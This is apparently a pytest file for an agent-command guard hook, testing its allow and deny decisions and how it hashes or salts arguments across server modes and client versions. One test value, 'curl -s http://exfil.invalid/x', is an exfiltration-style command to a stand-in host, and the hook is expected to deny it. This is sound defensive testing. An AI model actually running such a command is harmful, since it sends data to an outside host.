"""0.2.35: the real thin hook (deus_witness.hook.main.judge) against the real server's /v1/hook/judge under DW_ARGS_SALT=off|transition|on,
with a client 0.2.26 and with an old one (no X-DW-Args-Salt header, bare SHA-256)."""
import os
import sys

import httpx
import pytest

from app import _paths  # noqa: F401

sys.path.insert(0, os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "../../mcp")))
from tests.test_0217_judge import agent  # noqa: F401  (fixture; importing it also puts deus_witness on the path)
from tests.test_0217_judge import _body
from deus_witness import client as dwc
from deus_witness.hook import main as thin
from tests.test_0216_thin import Via

ALLOW, DENY = "ls", "curl -s http://exfil.invalid/x"


class NoHeader(Via):
    def handle_request(self, request):
        h = {k: v for k, v in request.headers.items() if k.lower() not in ("x-dw-args-salt", "content-length")}
        return super().handle_request(httpx.Request(request.method, request.url, headers=h, content=request.read()))


class OldWitness(dwc.Witness):
    """an old client: bare SHA-256, no capability header"""
    def salt(self):
        return None


def run(client, agent, tmp_path, monkeypatch, mode, old, cmd):
    client.app.state.ctx.cfg.args_salt = mode
    p = os.path.realpath(str(tmp_path))
    monkeypatch.setenv("CLAUDE_PROJECT_DIR", p)
    key = agent["Authorization"][7:]
    s = thin.Settings({"DEUS_WITNESS_KEY": key, "CLAUDE_PROJECT_DIR": p, "DEUS_WITNESS_EXEC_SCAN": "0"})
    cls, tr = (OldWitness, NoHeader) if old else (dwc.Witness, Via)
    w = cls("http://localhost:8810", key, pin_path=str(tmp_path / "pins" / "w.json"), transport=tr(client))
    o = thin.judge({"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": p}, s, witness=w)["hookSpecificOutput"]
    return o["permissionDecision"], o.get("permissionDecisionReason", ""), w


def last_hash(client, mode):
    ctx = client.app.state.ctx
    import json
    return [json.loads(r["action_json"])["args_sha256"] for r in ctx.db.q("SELECT action_json FROM actions WHERE action_json IS NOT NULL ORDER BY created_at, rowid")]


@pytest.mark.parametrize("mode,old,salted", [("off", False, False), ("off", True, False), ("transition", False, True),
                                             ("transition", True, False), ("on", False, True)])
def test_hook_allow_and_deny_by_rules(client, agent, tmp_path, monkeypatch, mode, old, salted):
    d, why, w = run(client, agent, tmp_path, monkeypatch, mode, old, ALLOW)
    assert d == "allow", why
    assert (w.salt() is not None) == salted
    d2, why2, _ = run(client, agent, tmp_path, monkeypatch, mode, old, DENY)
    assert d2 == "deny" and "ESCALATE_COMMAND_DANGER" in why2 and "exfil.invalid" in why2, why2      # 0.2.91: a host outside the domains is asked


def test_hook_records_salted_for_new_and_bare_for_old_in_transition(client, agent, tmp_path, monkeypatch):
    seen = {}
    for old in (False, True):
        n0 = len(last_hash(client, "transition"))
        d, why, _ = run(client, agent, tmp_path, monkeypatch, "transition", old, "ls -la")
        assert d == "allow", why
        seen[old] = last_hash(client, "transition")[n0:]
    assert len(seen[False]) == 1 and len(seen[True]) == 1 and seen[False][0] != seen[True][0]
    salt = bytes(client.app.state.ctx.db.one("SELECT args_salt FROM accounts")["args_salt"])
    assert len(salt) == 32           # the account got a salt; the new client's record is HMAC under it (checked by the hook itself: REQUEST_MISMATCH otherwise)


def test_on_old_hook_is_refused_426_and_nothing_is_written(client, agent, tmp_path, monkeypatch):
    n0 = client.app.state.ctx.db.one("SELECT COUNT(*) AS n FROM actions")["n"]
    d, why, _ = run(client, agent, tmp_path, monkeypatch, "on", True, ALLOW)
    assert d == "deny"
    assert client.app.state.ctx.db.one("SELECT COUNT(*) AS n FROM actions")["n"] == n0
    client.app.state.ctx.cfg.args_salt = "on"
    p = os.path.realpath(str(tmp_path))
    r = client.post("/v1/hook/judge", json=_body(ALLOW, p), headers=agent)
    assert r.status_code == 426 and r.json()["error"] == "ARGS_SALT_REQUIRED", r.text
    r = client.post("/v1/hook/judge", json=_body(ALLOW, p), headers={**agent, "X-DW-Args-Salt": "1"})
    assert r.status_code == 200, r.text
